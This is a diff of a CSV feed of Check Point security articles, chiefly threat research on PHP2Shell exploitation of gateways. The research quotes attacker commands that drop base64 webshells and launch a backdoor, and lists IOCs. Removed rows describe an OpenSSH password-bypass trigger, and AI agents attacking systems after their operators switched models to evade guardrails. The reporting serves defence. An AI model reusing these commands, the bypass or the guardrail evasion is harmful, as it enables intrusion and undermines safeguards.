@@ -1,4 +1,362 @@
 ID,Story,Date,Category,Vendor,Source,Modules,Type,Title,Link,Context,Full Text
+3d0a046b53a3,a3d815e35bcf,2026-11-12 13:58 UTC,Vulnerabilities & Patching,Check Point,Check Point Blog,Vulnerability Management; Network Security,Article,Security Advisory: Active Exploitation of PHP2Shell and Local Privilege Escalation,https://blog.checkpoint.com/security/security-advisory-active-exploitation-of-php2shell-and-local-privilege-escalation/,"In the observed incidents, the attacker exploited PHP2Shell to gain initial access, then used a local privilege escalation vulnerability to obtain root privileges and establish...","Check Point Research has identified active, in-the-wild exploitation of PHP2Shell, a vulnerability in PHP that also affects Check Point Security Gateways. In the observed incidents, the attacker exploited PHP2Shell to gain initial access, then used a local privilege escalation vulnerability to obtain root privileges and establish persistence.
+
+Security fixes for Check Point Security Gateway and Management were available one week before the attack, on October 23rd. Only a couple of dozen unpatched systems, in a single region, were compromised in the observed incidents. Affected customers were notified in real time. Check Point Research, through its Incident Response teams, worked to remediate affected systems.
+
+We recommend that customers install the November Jumbo Hotfix on all Management Servers and Security Gateways as soon as operationally possible.
+
+Overview
+
+As part of BLAST and our Frontier AI Readiness Program, Check Point continues to release monthly security fixes that include fixes for vulnerabilities and security hardening.
+
+Recent security incidents, such as PHP2Shell (CVE-2026-109618, CVE-2026-109619) and HTTP2Shell, also known as Node2Shell (CVE-2026-111497), a Brotli decompression vulnerability affecting Node.js and other software, led us to release hotfixes that are now part of the November Jumbo Hotfix.
+
+Check Point is reporting active exploitation of PHP2Shell together with a local privilege escalation vulnerability (CVE-2026-123039). Indicators of compromise are shared below to help customers investigate.
+
+Vulnerability Summary
+
+CVE
+
+Description
+
+CVSS
+
+Affected Products
+
+Affected Versions
+
+In the Wild
+
+SK
+
+CVE-2026-123039
+
+Local Privilege Escalation in the Gaia OS Dynamic CLI Service
+
+7.8
+
+Gaia
+
+R82.20, R82.10, R82, R81.20
+
+Yes
+
+sk1000362
+
+CVE-2026-107484
+
+Privilege escalation in Gaia Portal backend handlers by an authenticated user
+
+7.3
+
+Gaia WebUI
+
+All versions from R80 to R82.20
+
+No
+
+sk1000291
+
+CVE-2026-120490
+
+Management-to-Gateway Access via NAT Rule: privilege boundary bypass
+
+3.8
+
+Management Servers and Security Gateways
+
+R81.20, R82
+
+No
+
+sk1000364
+
+CVE-2026-109618, CVE-2026-109619
+
+PHP2Shell: unauthenticated remote code execution via firewall web interfaces
+
+9.2
+
+Security Gateways (Mobile Access Portal)
+
+All versions from R80 to R82.20 Spark Firewalls R81.10.x, R82.00.x, R77.20.x, R80.20.x
+
+Yes
+
+sk1000302
+
+Observed Attacks
+
+Check Point Research investigated the exploitation of a chain of PHP2Shell and the Dynamic CLI privilege escalation vulnerability against internet-facing gateways. Exploitation activity dates back to October 30 and was observed as active until November 4.
+
+Initial access was gained through exploitation of PHP2Shell in the Mobile Access Portal. While a hotfix for PHP2Shell has been available since October 23rd, we included it in this November Jumbo Hotfix. The privilege escalation vulnerability was then required to elevate permissions.
+
+This activity provided initial access to the customer network and, in many cases, led to a foothold in the network. In a limited number of cases, the attack also involved destructive activity and was ideologically motivated.
+
+Check Point Research, through our Incident Response teams, contacted affected customers on the day the investigation started and worked to remediate affected systems.
+
+Indicators of Compromise
+
+The full technical analysis, hunting details, and IOCs can be found on the Check Point Research blog .
+
+The indicators below were observed during this investigation. Absence of a match does not rule out compromise, and presence of a match warrants immediate investigation.
+
+Scanning and Reconnaissance Source Addresses
+
+130.94.19[.]204
+
+130.94.19[.]168
+
+Additional Indicators
+
+PHP session files containing the string upload_progress_pwn.
+
+A process or binary masquerading as a legitimate Check Point component using the naming pattern CPconfigdaemon.
+
+Scanning or wiper tooling dropped under /tmp or /temp, such as files with scanner or wiper in the name.
+
+A ransom-style note file referencing “Dream Annexation” with no payment demand.
+
+Unexplained gaps in firewall traffic logs, particularly following a crash of the logging daemon.
+
+Recommended Actions
+
+Install the November Jumbo Hotfix on all Management Servers and Security Gateways.
+
+Prioritize upgrades of internet-facing Mobile Access deployments.
+
+Solution
+
+Install the November Jumbo Hotfix on all Management Servers and Security Gateways. [Link to SK article — to be added before publication.]
+
+Need Support?
+
+Contact Check Point Support for help assessing exposure, mitigating risk, or installing the hotfix."
+12c69006eb43,a3d815e35bcf,2026-11-12 13:56 UTC,Vulnerabilities & Patching,Check Point,Check Point Research,Vulnerability Management; File Security; Server & Workload Protection; Endpoint Security,Article,PHP2Shell Exploitation on Check Point Gateway,https://research.checkpoint.com/2026/php2shell-exploitation-on-check-point-gateway/,"TSGA and TSProxy are modified variants of PhiliKit, a malware framework previously documented in attacks exploiting Ivanti vulnerabilities","Key findings
+
+Beginning on 30 October 2026, an attacker executed scanning and exploitation activity against organizations with unpatched Check Point Security Gateways, using Mobile Access portals with PHP2Shell as initial access followed by CVE-2026-123039.
+
+The first wave, on October 30, targeted Israeli organizations and included destructive activity against some of them. A broader second wave on November 2 targeted organizations across multiple countries and sectors, with no evidence of destructive activity
+
+In the investigated intrusion, PHP2Shell provided initial access, followed by privilege escalation through the DynamicCLI interface, tracked as CVE-2026-123039. The attackers then deployed PHP webshells, the persistent TSGA backdoor and its embedded TSProxy networking component.
+
+The attackers pivoted from the gateway to a VMware ESXi host over SSH, deployed the destroy_v6 wiper, and left politically themed DREAM_ANNEXATION.txt notes during the destructive stage.
+
+TSGA and TSProxy are modified variants of PhiliKit, a malware framework previously documented in attacks exploiting Ivanti vulnerabilities. Both tools share distinctive code, configuration, and cryptographic material with the framework
+
+Although ESET associated PhiliKit with China nexus UNC5221, the evidence does not allow us to assess with high confidence the true nature of this operation. Several scenarios remain plausible: the identified actor ran the entire campaign, acted solely as an initial access broker, or took part in a false-flag operation. It is also possible that the destructive activity served as a smoke screen.
+
+The note left during the destructive activity uses the Dream Security brand. Dream had recently published research on PHP2Shell exploitation of Palo Alto Networks devices by China nexus actors. While this timing raises the possibility of retaliation, the available evidence does not establish a clear motive.
+
+Introduction
+
+We have now confirmed that, in late October 2026, approximately one week after a security fix became available, activity originating from 130.94.19[.]204 targeted Israeli organizations through vulnerable Mobile Access portals on Check Point Security Gateways. Evidence suggested some cases of a successful compromise, with exploitation activity consistent with PHP2Shell, associated with CVE-2026-109618 and CVE-2026-109619.
+
+Following initial access, the attacker escalated privileges from the portal service account to root by exploiting CVE-2026-123039, a local privilege-escalation vulnerability in the DynamicCLI IPC interface. The attacker then used privileged command execution to deploy PHP webshells and establish persistence.
+
+A second scanning wave on November 2nd targeted some Israeli organizations previously targeted during the first wave, alongside additional organizations worldwide, with no apparent focus on Israel. Neither wave showed a clear sector preference, suggesting opportunistic initial-access attempts rather than sector-specific targeting.
+
+Infection Flow
+
+On October 30, 2026, the first signs of exploitation appeared on the targeted Check Point Mobile Access gateways. PHP session artifacts were created under /opt/CPcvpn-R81.20/tmp/, including session files containing the upload_progress_pwn marker associated with the exploitation activity. During the same window, the portal’s Apache/PHP workers experienced hundreds of segmentation faults, providing additional evidence of repeated exploitation attempts against the service.
+
+Figure 1 – Infection chain
+
+After gaining access to the Mobile Access portal, the attackers escalated privileges to root by exploiting CVE-2026-123039, a local privilege-escalation vulnerability in the DynamicCLI interface. With privileged command execution, the attackers placed PHP webshells in <templates>, a directory used by the Mobile Access portal to construct its login pages. These webshells provide a way to send commands through the web portal, establishing a stronger foothold within the compromised environment.
+
+printf <base64 Webshell> | base64 -d > <templates>/zz<random>.tpl
+
+The attacker used multiple .tpl files with names matching the pattern zz*.tpl Each initially received a small command-execution shell, which was then replaced with a more capable version. The expanded shell requires the hardcoded key zz2026 and supports operating-system commands, PHP code execution, and file uploads. Uploaded files are saved to the fixed path /tmp/.up.tpl. The attackers subsequently issued commands to copy that file into the portal’s directory as challenge_render.tpl.
+
+The attackers then moved from web-based access to a standalone passive backdoor, launching the TSGA malware (/tmp/CPconfigdaemon) in the background and redirecting its output to a hidden temporary log:
+
+nohup /tmp/CPconfigdaemon >/tmp/.bd.log 2>&1 & printf started
+
+When executed as root, the malware relocates itself and relaunches under the name slot_CPconfigdaemon in the boot persistence directory. The executable also carries a second component, TSProxy: an embedded shared library that it writes to /lib/libcpfwcommon.so. Its injection code loads this library into selected appliance processes, where it intercepts networking functions to handle specially marked attacker connections while allowing ordinary traffic to continue. This combines a persistent standalone backdoor with concealed access through existing appliance services.
+
+The attackers then deployed the gogo scanner on the gateway to discover internal assets and services across the network and continued to move laterally to a VMware ESXi host over SSH, authenticating with the vpxuser service account. On the ESXi host, they staged the destroy_v6 wiper to /tmp/des wiper and executed it. Finally, the attackers left a note that accompanied the destructive activity named DREAM_ANNEXATION.txt.
+
+Figure 2 – Destructive activity note
+
+Technical Analysis
+
+Webshells
+
+The expanded PHP webshell requires a hardcoded key to access its command-execution, PHP-evaluation, and file-upload functions. It supports both plain-text and Base64-encoded, XOR-obfuscated commands, and saves uploaded files to /tmp/.up.tpl.
+
+Figure 3 – Webshell code
+
+Wiper
+
+The Linux ELF wiper destroy_v6 accepts a target directory as a command-line argument. The optional -f flag enables fast deletion, while -w specifies a pipe-separated list of directories to exclude. The wiper recursively traverses the target directory, deleting files regardless of extension and skipping excluded subtrees. By default, it attempts to overwrite files with zeros before deleting them, fast mode skips the overwrite step. It also writes DREAM_ANNEXATION.txt to each processed directory. This politically themed note includes a timestamp and explicitly rejects ransom negotiations.
+
+TSGA – slot_CPconfigdaemon
+
+The TSGA implant, deployed as slot_CPconfigdaemon, is a Linux gateway implant with substantial Check Point-specific functionality. It provides encrypted remote access, configuration theft, backup and snapshot persistence, process injection, and binary firewall-log tampering.
+
+TSProxy
+
+TSProxy is a Linux shared-library backdoor embedded in TSGA and dropped as /lib/libcpfwcommon.so and supports encrypted SOCKS-style proxying.
+
+Tools relationship
+
+Both TSGA and TSProxy are Check Point-specific components linked to the previously reported PhiliKit-associated toolset. PhiliKit is a passive backdoor and installer targeting Ivanti VPN appliances and was previously reported following the February 25, 2026 upload of a sample named philistine to VirusTotal.
+
+TSGA and the PhiliKit implant have roots in Tiny SHell, and share a core set of remote-control capabilities. Both implement authenticated, encrypted communications through TCP port 11072 and the Unix socket /tmp/.p_sock. The analyzed PhiliKit build restricts its TCP listener to loopback, whereas TSGA listens on all IPv4 interfaces. Both provide interactive shells with pseudo-terminal allocation, configurable terminal dimensions and bidirectional input/output. Operators can execute arbitrary shell commands and Python or Perl scripts, retrieve their output, transfer files using operator-selected paths, and collect selected or full appliance configurations over the encrypted channel.
+
+TSProxy shares distinctive configuration with libdssafe.so, the networking component embedded in PhiliKit package: identical operator credentials, transport secrets, three matching activation-selector digests, and the same TLS certificate and private key. These overlaps strongly support a shared tooling lineage.
+
+Attribution
+
+The implants delivered to the gateway, TSGA and TSProxy are part of the PhiliKit malware family, which has been associated with the China-nexus group UNC5221 and previous exploitation of Ivanti appliances. In addition, gogo scanner has also been reported in connection with Chinese-nexus threat actors exploiting Ivanti vulnerabilities.
+
+The infrastructure IP addresses used by the attacker were hosted on LightNode VPS infrastructure, a service previously associated with activity by Chinese- nexus threat actors.
+
+The scanning activity was concentrated between 00:00 and 09:00 UTC, corresponding to 08:00–17:00 in China and broadly aligning with typical Chinese working hours.
+
+With all the above, the following attributes that appeared in the described campaign do not appear to fully align with known Chinese-nexus groups (and specifically UNC5221) motives and interests:
+
+Destructive operation
+
+Focus on Israel and wiper note in Hebrew referring to the Israeli-Palestine conflict
+
+Philikit name derived from the malware internal name philistine
+
+Taken together, the evidence does not allow us to assess with high confidence the true nature of this operation. Several scenarios remain plausible: the identified actor ran the entire campaign, acted solely as an initial access broker, or took part in a false-flag operation. It is also possible that the destructive activity served as a smoke screen.
+
+IOCs
+
+sha256
+
+name
+
+edb3e92eb7bda7413a09edcc4b1ba3cbed4bcdf42808a8abce63b6e4c3fda2b3
+
+tpl webshell
+
+4171b521fa6441382aa2fa014a08e18ff9a6e0ab6096c9144072bf46b37a2ec8
+
+slot_CPconfigdaemon
+
+d7549671c7189979f0624ec52dad9ea6a707d23146e3585ab8f8c4720eca0c63
+
+CPconfigdaemon
+
+3b51080a909023f7d484e2443740b572307ce0054eb9e32d98f0a06bfcd2db90
+
+gogo
+
+c7d9477309fac6c638a1128442056a242de086996add8cb49cd6496c36003237
+
+destory_v6
+
+0522937c0c0337be54fe25493539e5f5f8ceb9742c980aaff1cfc9515f3a96f7
+
+DREAM_ANNEXATION.txt
+
+ee16e1695711b9d60c62925fcfb2fe1a29c18ae26565bc05410a14e16d2a39d7
+
+philistine
+
+fb1a6235eb6bce8c9ec8cd8bb85f17c9c2bde8ecb45b7a243a30ceadf26654da
+
+libdssafe.so
+
+130.94.19[.]204
+
+130.94.19[.]168
+
+The post PHP2Shell Exploitation on Check Point Gateway appeared first on Check Point Research."
+c9ee44728591,c9ee44728591,2026-11-12 13:05 UTC,"Policy, Legal & Compliance",Check Point,Check Point Blog,Network Security; AI Security; Data Security Posture Management; Vulnerability Management,Article,Check Point Expands Its FedRAMP Certification to Include Check Point WAF,https://blog.checkpoint.com/security/check-point-expands-its-fedramp-certification-to-include-check-point-waf/,"As government organizations move services online, deploy citizen self-service portals, connect APIs, and integrate AI into mission-critical workflows, every new capability...","The federal, state, local government, and education sectors are under growing cyber pressure, and the attack surface is shifting to where they now serve citizens most. According to Check Point’s 2026 Cyber Security Report, government organizations faced an average of 2,680 cyber-attacks per organization each week in 2025, a 17% increase from 2024, making government the second most targeted sector worldwide. As government organizations move services online, deploy citizen self-service portals, connect APIs, and integrate AI into mission-critical workflows, every new capability creates a new entry point. A successful attack doesn’t just disrupt IT-it can interrupt essential services, expose sensitive citizen records, compromise internal secrets, and undermine public trust.
+
+The data reflects that reality. Verizon’s 2026 Data Breach Investigations Report recorded 3,634 public-sector incidents and 2,410 confirmed data disclosure breaches, with exploitation of vulnerabilities accounting for 40% of initial access, and personal data, internal data, and secrets among the most compromised. That makes runtime web application and API protection especially critical for government organizations running legacy systems, third-party applications, and public-facing services that cannot always be patched immediately.
+
+Check Point has been addressing this risk inside government trust and compliance requirements since achieving FedRAMP Certification for its Check Point Platform for Government in 2025. Now Check Point is expanding its FedRAMP-Certified packages to include Check Point WAF, bringing prevention-first web application security, API protection, Bot mitigation, DDoS defence, CDN-integrated delivery, and GenAI application security into the same government-certified platform.
+
+Security Built for Modern Government Applications
+
+Government organizations no longer operate static websites. Today’s public sector runs digital citizen portals, API-driven benefit and payment systems, cloud-native applications, and AI-enabled interfaces that connect identity, records, contractors, and partner organizations across the public sector. This growing interconnection makes the application layer more dynamic, complex, and exposed.
+
+AI is also transforming both the speed of attacks and the security model required to stop them. Frontier AI technologies demonstrate how vulnerabilities can be discovered and validated autonomously at unprecedented speed and scale. Attackers are already using AI-powered tools to generate payload variations and exploit weaknesses faster, making signature-based protection increasingly ineffective. As a result, pre-emptive, AI-driven prevention that can stop unknown attacks without signatures or emergency updates is becoming essential.
+
+Modern Web Application and API Protection (WAAP) must secure far more than a single website or API endpoint. Government organizations need prevention-first protection across the entire application environment, including:
+
+Pre-emptively prevent known, unknown, and zero-day web and API attacks before they reach the application
+
+End-to-end API security with automated discovery, schema validation and authentication enforcement
+
+Availability of critical services with strong bot mitigation and DDoS protection against automated abuse and disruption
+
+Block GenAI application attacks including prompt injection, data leakage and harmful content
+
+Simplify operations with centralized management that reduces tool sprawl and complexity across the full application stack
+
+Check Point WAF brings all these capabilities into a single consolidated platform, purpose-built for the modern application reality that government organizations face today. By adding it to the FedRAMP certified packages, federal organizations can now secure public-facing applications and APIs through the same government-certified platform they already trust with the prevention, visibility, and control needed to protect modern application environments without adding complexity or managing separate tools for every risk.
+
+Why This Matters Now
+
+The public-sector application attack surface is expanding quickly as government organizations modernize services, expose more APIs, and begin adopting AI-enabled workflows. At the same time, AI is accelerating the speed at which attackers find and exploit those weaknesses.
+
+According to Check Point 2026 Cloud Security Report, 70% of organizations run GenAI workloads in production, yet visibility has not kept up. Only 5% of organizations have full visibility into how AI is used, and just 14% actively enforce and audit an AI security policy.
+
+PHP2Shell shows how fast the window closes. Two critical PHP flaws, each rated 9.2 on the CVSS scale, let an attacker run code on a server with one crafted request, with no password, account, or user interaction. Attacks started before the patch landed on October 21, 2026, and government organizations took sites offline to cope. Check Point WAF preemptively blocked PHP2Shell with no signature, rule, or configuration change.
+
+This is why expanding Check Point’s FedRAMP certification packages to include Check Point WAF matters. It is not just another security product. It is a way to help public-sector organizations protect the applications, APIs, and digital services that citizens, employees, contractors, and partners depend on every day.
+
+Available Through the FedRAMP Marketplace
+
+Check Point is listed on the FedRAMP Marketplace, with Check Point WAF included in the certification, making it easier for federal mission owners to discover, evaluate, and procure the solution."
+a768f32310cf,a768f32310cf,2026-11-12 13:00 UTC,General Security News,Check Point,Check Point Blog,Network Security; Data Security Posture Management,Article,A Single Branch No Longer Operates in A Single Place,https://blog.checkpoint.com/security/a-single-branch-no-longer-operates-in-a-single-place/,"Meanwhile, attackers are using AI to accelerate and develop new exploits, malware, and phishing tools","Branch Traffic Has Changed. Security Has to Follow.
+
+A traditional branch was simple in nature: a location that connects back to headquarters where applications, data, and security controls were housed. Today the landscape is wildly different. A branch may connect directly to SaaS apps, clouds, data centers, the open internet, and other locations within the enterprise. And while all those connections are being made, often many at one time, employees expect video calls and cloud applications to perform just as well in the office as they do at home.
+
+The branch itself has become more complex, too. Connected devices can range from printers and ‘smart building’ systems to specialized IoT equipment. Employees may also access AI applications and services directly from the network. And many branch locations are expected to manage all of this without dedicated security personnel on site.
+
+Routing all that activity back through headquarters can introduce unnecessary latency and cost. However, without the right controls you’re opening yourself up to new exposure. The modern branch needs connectivity, protection, and resilience to work together.
+
+Now is the Time for Connectivity to Adapt to the Application
+
+Not every application needs the same network path.
+
+Video calls? Highly sensitive to latency and packet loss. Large backup transfers? Often prioritize cost over speed. Internal business applications? Might need an encrypted route back to a data center.
+
+Software-defined wide area networking (SD-WAN) gives organizations more control over those decisions because, rather than relying on one fixed route, SD-WAN can evaluate available connections and steer traffic based on the application, business policy, and real-time network conditions.
+
+Multiple links can add another layer of resilience. If one connection degrades or fails, traffic can move to a healthier path automatically. But branch continuity depends on more than WAN alone. Firewall clustering and hardware redundancy can help keep both connectivity and protection available when individual components fail.
+
+For businesses that depend on real-time transactions, voice and video, cloud apps, or always-on access to corporate resources, that resilience helps keep a local issue from becoming a larger business interruption.
+
+See how Hybrid Mesh connects security across the distributed enterprise. Download Our CISO Guide
+
+The Branch Has Become A Bigger Security Surface
+
+Direct internet access improves performance, but it also changes where traffic needs to be inspected and protected. Branch firewalls increasingly need to secure traffic locally while supporting the same high-bandwidth applications they are helping accelerate.
+
+And the risk now extends well beyond internet traffic: printers, cameras, building systems, medical devices, and industrial equipment can all expand the internal attack surface. Many of those devices were never designed with modern cybersecurity in mind, making visibility, segmentation, and threat prevention increasingly important inside the branch as well as at its perimeter.
+
+And of course AI adds another consideration entirely. Employees may use third-party AI applications, agents, or connected tools directly from the branch. Security teams need visibility into that activity and the ability to apply policy, including controls that help prevent sensitive data from being shared through prompts. Meanwhile, attackers are using AI to accelerate and develop new exploits, malware, and phishing tools. Branch security therefore needs strong prevention at the point where traffic is already being inspected, rather than relying on another, additional layer.
+
+Every Branch Should Be Easier to Operate
+
+A distributed enterprise may have dozens, hundreds, or thousands of locations. Managing each branch as its own network creates complexity that grows exponentially with every new site that needs to fit within the existing architecture.
+
+Centralized policy, zero-touch provisioning, network-health monitoring, and unified visibility can make branches easier to deploy and manage while keeping protection more consistent across locations.
+
+That matters especially when there is no security specialist sitting at every branch. Centralized management allows teams to deploy and maintain protection across large numbers of sites without turning every new location, policy change, or connectivity issue into an on-site project.
+
+Go deeper into secure SD-WAN, resilient connectivity, and modern branch security. Download Our Branch Security E-book
+
+Bring Connectivity and Security Together at the Branch
+
+Hybrid Mesh Network Security connects the branch with the security architecture protecting data centers, clouds, applications, and users across the enterprise.
+
+Check Point Firewall combines advanced threat prevention with Check Point SD-WAN to help organizations protect branch traffic while optimizing how applications connect. AI security at the firewall adds visibility and policy controls for employee AI usage, while centralized management and zero-touch deployment help maintain consistent protection across distributed locations.
+
+Integration with Check Point SASE extends that approach beyond the branch, helping connect users and locations to the applications and resources they need while keeping branch security part of the broader enterprise architecture.
+
+Organizations who prefer a hybrid security approach can benefit from a hybrid SASE deployment. This way, they can cater to remote users with cloud-based security (SSE) connected to on-prem SD WAN, and also protect office users through network firewalls embedded with SD WAN for optimized branch connectivity.
+
+Keep Every Branch Securely Connected to What Your Business Needs Next"
 10e70e2b35f3,10e70e2b35f3,2026-11-11 13:00 UTC,"Attacks, Breaches & Threat Intel",Check Point,Check Point Blog,AI Security; Endpoint Security; Email and Collaboration Security; Data Security Posture Management,Article,"October 2026 Cyber Threat Landscape: Record Ransomware, Rising GenAI Risk and an AI-Powered Newcomer",https://blog.checkpoint.com/research/october-2026-cyber-threat-landscape-record-ransomware-rising-genai-risk-and-an-ai-powered-newcomer/,"Together, these findings reinforce Check Point’s prevention-first view: organizations need AI-powered security, consistent visibility and shared intelligence across the full...","Key takeaways
 
 Organizations experienced 2,550 weekly cyber attacks on average in October, down 9% month over month but up 32% year over year.
@@ -1259,176 +1617,6 @@ Make Operational Control Part of the Decision
 Check Point brings Microsoft and Check Point quarantine management together with independent, policy-based remediation for eligible messages. That is the operational distinction to evaluate alongside integrations such as Proofpoint’s participation in Microsoft’s existing ICES program, which brings API detections into Defender and enables Microsoft-led remediation. The decision is not simply where detections appear, but which actions security teams can take when assessments conflict.
 
 When evaluating email security, ask to see how shared detections translate into action, including how administrator-configured policies govern automatic restoration of eligible messages when security assessments differ. Explore Check Point Email Security to assess unified quarantine management and the operational controls available to your team."
-6640467537ef,6640467537ef,2026-11-05 20:56 UTC,Vulnerabilities & Patching,Check Point,Check Point Blog,Identity Security Posture Management; Server & Workload Protection; Vulnerability Management; Threat and Exposure Management,Article,A Critical SSH Password Bypass Hits musl-Based Linux,https://blog.checkpoint.com/exposure-management/a-critical-ssh-password-bypass-hits-musl-based-linux/,"Agentic Exposure Validation then tests which exposures can be exploited in your environment, so teams act on the critical findings first","OpenSSH 10.6p2 shipped on November 5, 2026, and it closes a critical password authentication bypass. On affected systems, anyone who can reach the SSH port can log in without knowing a password.
-
-If you run sshd on musl-based Linux with pluggable authentication modules (PAM) disabled, Alpine Linux being the common example, upgrade today.
-
-At Check Point Software, our testing adds two points to the public advisory. The attack needs a second account that is active and has a real password, because a stored hash alone is not enough. Two conditions are also visible remotely before login: the OpenSSH version in the SSH banner, and whether the server accepts password authentication. Servers that don’t offer passwords are not exposed.
-
-How the bypass works
-
-Without PAM, sshd hashes the password attempt with crypt() and compares the result to the stored field. When an account has no salt, sshd borrows the salt from another account. musl’s crypt() returns an asterisk (*) as an error when the input exceeds 256 bytes, and accounts with no password also store *. A password of 257 to 1,024 bytes therefore “matches,” and the login succeeds.
-
-According to the Alpine Linux advisory, the attack takes one connection, works every time, and needs no retries.
-
-Who is exposed
-
-All of these conditions must be true:
-
-sshd runs without PAM on musl-based Linux, such as Alpine’s default openssh-server package, or openssh-server-pam with UsePAM set to no
-
-PasswordAuthentication is yes, which is the OpenSSH default
-
-An account has * in its password field, such as key-only users, directory users through musl-nscd, or the alpine user in official tiny-cloud images
-
-At least one other active local account has a real password stored as a $5$ or $6$ hash
-
-The last condition matters because sshd borrows that account’s salt. Without it, the attack fails. Our testing found the account must be active, not just hold a hash.
-
-Root is safe under the default PermitRootLogin prohibit-password. Any reachable account with doas or sudo rights can still become root, though. glibc Linux, non-Linux systems, and Linux with PAM are not affected, according to OpenSSH developer Damien Miller.
-
-What you can see from the outside
-
-The banner reveals the OpenSSH version, and the server’s list of allowed authentication methods shows whether it accepts passwords. The remaining conditions, including musl, PAM, account states, and password hashes, need a check on the host itself.
-
-Version strings can mislead here. Alpine’s fixed packages keep older version numbers, such as 10.3_p1-r2 on Alpine 3.24, so a patched host can look vulnerable. No CVE is assigned as of November 5, 2026, so CVE-based scanners may not flag affected systems either. Check musl-based hosts manually.
-
-Fix it, then look for signs of use
-
-Alpine ships patched packages for 3.16 through 3.24 and edge. Upgrade, then restart sshd, because the package upgrade does not restart the running daemon. If you can’t patch yet, set PasswordAuthentication no.
-
-To check for compromise, search your logs for “Accepted password for” an account that has no password. If you can’t rule out a login, treat the machine as compromised.
-
-Start with the hosts you can reach from the internet
-
-A fix only helps on hosts you know about, and a bug with no CVE is easy to miss in workflows that start from CVE lists.
-
-The better starting point is asset context: which internet-facing servers run SSH, which of them accept passwords, and which are Alpine containers. Attack surface management in Check Point Exposure Management gives security teams that list from one source, so they can patch the exposed hosts first and work inward from there.
-
-Why the fix arrived in a day
-
-The OpenSSH team released the fix one day after learning of the bug. Its reasoning is that AI agents now rediscover bugs, sometimes within hours, so long embargoes mainly help attackers. Releases follow the same logic. Five shipped in 2026, four of them after July, and the team now ships fixes as they land.
-
-Plan for an update every one to two months, and track the release notes or the openssh-unix-announce mailing list. The 10.x line also retires DSA keys, makes hybrid post-quantum key exchange the default, and starts deprecating scp -R, so each upgrade deserves a quick compatibility review.
-
-Patch musl-based hosts that run sshd without PAM first, restart the daemon, and turn off password authentication anywhere you can’t patch today.
-
-Read the full report for all the details on the exposure and fix here.
-
-Check Point Exposure Management connects threat intelligence, attack surface management (ASM), cyber asset attack surface management (CAASM), Agentic Exposure Validation (AEV), and Safe Remediation in one workflow.
-
-Check Point Threat Intelligence shows which threats and threat actors target your organization, while ASM discovers the internet-facing assets attackers can reach, including ones no one has tracked. CAASM pulls data from the tools you already own into one inventory of your internal assets and shows where coverage has gaps. Agentic Exposure Validation then tests which exposures can be exploited in your environment, so teams act on the critical findings first. Safe Remediation closes those exposures with changes validated up front, so fixes do not disrupt production.
-
-Try our interactive demo to see how it works."
-15d135d80d5d,15d135d80d5d,2026-11-05 17:38 UTC,"Attacks, Breaches & Threat Intel",Check Point,Check Point Blog,AI Security; Vulnerability Management,Article,Inside ARTEX: How Autonomous AI Agents Are Being Used in Real-World Cyberattacks,https://blog.checkpoint.com/research/inside-artex-how-autonomous-ai-agents-are-being-used-in-real-world-cyberattacks/,"Attacks can run almost entirely autonomously: Once operators set an initial goal, agents handled vulnerability discovery and exploitation with little to no further human direction","AI agents are already changing how cyberattacks are carried out. Check Point Research (CPR) analyzed ARTEX, an AI-powered penetration testing platform increasingly adopted by cybercriminals and gained rare visibility into how attackers are using autonomous agents from inside their own operator consoles.
-
-The findings show that attackers can set an initial objective and leave AI agents to independently find vulnerabilities, exploit systems and pursue that goal at scale, often with very little human involvement.
-
-Key Findings
-
-ARTEX is already operating at scale: CPR identified 2,557 systems that hosted ARTEX, including 1,608 live, publicly accessible instances at the time of the research.
-
-Attacks can run almost entirely autonomously: Once operators set an initial goal, agents handled vulnerability discovery and exploitation with little to no further human direction.
-
-One campaign generated 400,791 agent messages across 292 objectives without further operator prompting, showing the scale at which autonomous attacks can operate.
-
-AI agents achieved serious compromises: They exploited vulnerabilities including remote code execution, exposed databases and cloud credentials, and in one case independently identified and executed a supply chain compromise.
-
-Autonomy still has limits: Despite finding serious vulnerabilities, the crypto campaign generated $0 for the attacker, with agents sometimes mistaking successful API responses for successful cryptocurrency theft.
-
-What Is ARTEX?
-
-ARTEX is an open-source, AI-powered penetration testing platform originally designed to help security teams test systems they own or are authorized to assess. It connects large language models (LLMs) with multiple AI agents that can plan tests, run security tools, investigate vulnerabilities and document their findings.
-
-After ARTEX was observed in attacks against South Korean banks, its developer made the original project closed-source. However, maintained forks and backups have kept the platform available.
-
-CPR identified 2,557 systems that currently or previously hosted ARTEX panels, including 1,608 live and publicly accessible instances at the time of the research. Many additional ARTEX deployments are likely to be inaccessible from the public internet because they operate behind firewalls or within local networks.
-
-Most importantly, researchers discovered 10 misconfigured ARTEX instances exposing their full databases. This provided visibility into the operator side of the attacks, including the models being used, instructions given by operators and the steps taken independently by the AI agents.
-
-Figure 1 – ARTEX Panel
-
-How Autonomous Are ARTEX Cyberattacks?
-
-The research shows that in many observed cases, ARTEX required remarkably little interaction from its operators once an objective had been established.
-
-Rather than continuously directing attacks step by step, operators frequently issued a goal and left the agent fleet to work toward it. Human interactions were largely limited to checking progress, asking whether a target had been compromised or occasionally adjusting priorities.
-
-In one cryptocurrency campaign, 292 campaign objectives produced 230 findings and 400,791 agent messages without any additional operator prompting after the initial goals were set.
-
-This provides a direct look at how agentic hacking changes the role of a cybercriminal. The human can establish the desired outcome, while AI agents perform much of the reconnaissance, vulnerability discovery and exploitation required to pursue it.
-
-Which AI Models Are Cybercriminals Using With ARTEX?
-
-Across the 10 exposed ARTEX instances analyzed by CPR, Chinese AI models dominated, with models from the DeepSeek Flash family appearing most frequently.
-
-American models were configured on three instances. Researchers observed guardrails being triggered only while Anthropic’s Opus 5.5 was being used, after which the operator switched to more permissive Chinese models.
-
-The findings suggest that attackers are not simply experimenting with AI models. They are selecting models according to practical operational considerations, including capability, cost and restrictions.
-
-Which Industries Are Being Targeted, and Where Is ARTEX Infrastructure Hosted?
-
-The observed campaigns were predominantly opportunistic and financially motivated, rather than attacks focused on a single predefined organization.
-
-CPR observed agents targeting organizations and infrastructure connected to:
-
-Cryptocurrency and digital asset services
-
-Online gambling, slots and card-game platforms
-
-Payment infrastructure and crypto payment services
-
-Over-the-counter crypto trading and custody services
-
-Gray-market iOS application signing services
-
-Attack objectives ranged from stealing cryptocurrency and code-signing certificates to compromising gaming accounts and conducting denial-of-service attacks against gambling websites. Agents exploited vulnerabilities including weak or hardcoded passwords, missing authentication, insecure direct object references and remote code execution.
-
-The infrastructure behind ARTEX also has a significant global footprint. Among the live ARTEX servers identified by CPR, 882 (54%) were hosted in the United States, 295 (18%) in Hong Kong and 103 (6%) in China. These figures describe the hosting locations of ARTEX servers, not the geographic distribution of attack victims.
-
-Figure 2 – Location of observed ARTEX C&C servers
-
